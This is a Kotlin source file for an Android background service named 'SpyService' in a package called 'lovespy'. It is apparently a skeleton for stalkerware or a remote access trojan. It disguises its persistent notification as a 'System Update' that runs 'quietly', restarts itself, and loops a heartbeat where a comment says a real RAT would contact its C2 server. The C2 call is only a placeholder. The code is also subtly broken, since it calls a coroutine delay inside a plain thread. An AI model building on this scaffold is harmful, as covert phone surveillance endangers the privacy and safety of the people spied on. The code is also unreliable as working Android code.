package com.example.lovespy.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SpyService : Service() {
    private val CHANNEL_ID = "SpyServiceChannel"
    private val NOTIFICATION_ID = 1

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        Log.d("SpyService", "Service Created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Start background tasks
        launchBackgroundTasks()
        return START_STICKY
    }

    private fun launchBackgroundTasks() {
        // Example: Send a heartbeat or log location every 5 seconds
        // In a real RAT, you'd connect to your C2 server here
        Thread {
            while (true) {
                try {
                    delay(5000) // 5 seconds
                    sendHeartbeat()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }.start()
    }

    private fun sendHeartbeat() {
        // Placeholder for C2 communication
        Log.d("SpyService", "Sending Heartbeat...")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Spy Service", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Running in background"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = Notification.Builder(this, CHANNEL_ID)
        builder.setContentTitle("System Update")
        builder.setContentText("Running quietly...")
        builder.setSmallIcon(android.R.drawable.ic_menu_compass) // Generic icon
        return builder.build()
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }
}
